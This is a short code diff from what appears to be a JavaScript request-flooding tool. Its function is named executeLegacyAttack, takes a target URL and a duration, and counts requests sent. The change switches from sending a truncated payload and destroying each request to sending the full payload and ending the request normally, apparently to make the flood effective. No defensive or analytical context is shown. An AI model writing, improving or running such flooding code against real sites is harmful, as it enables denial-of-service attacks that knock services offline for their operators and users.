@@ -164,8 +164,8 @@ function executeLegacyAttack(targetUrl, durationSeconds) {
         req.on('error', (err) => {
             localError++;
         });
-        req.write(payload.substring(0, 10));
-        req.destroy();
+        req.write(payload);
+        req.end();
         localSent++;
     };
 
